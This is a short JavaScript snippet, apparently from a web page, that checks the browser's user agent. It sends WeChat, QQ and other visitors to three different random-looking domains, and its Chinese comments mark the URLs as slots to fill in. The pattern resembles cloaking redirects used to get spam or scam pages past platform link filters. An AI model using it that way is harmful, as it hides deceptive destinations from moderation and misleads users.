let is_weixin_qq = (function() {
    let ua = navigator.userAgent.toLowerCase();
    if (ua.match(/MicroMessenger/i) == 'micromessenger') {
        //如果是微信则打开此链接   ！！按照书写标准写入到"内！！
        window.location.href = "http://www.xiyuhh678.cn/ewmdy/"
    }else
    if (ua.match(/QQ/i) == 'qq') {
        //如果是QQ则打开此链接   ！！按照书写标准写入到"内！！
        window.location.href = "http://www.dfg9628xi.store/ewmdy/"
    } else {
        //如果不是微信也不是QQ则打开此链接   ！！按照书写标准写入到"内！！
        window.location.href = "http://www.yanxi582.store/ewmdy"
    }
})();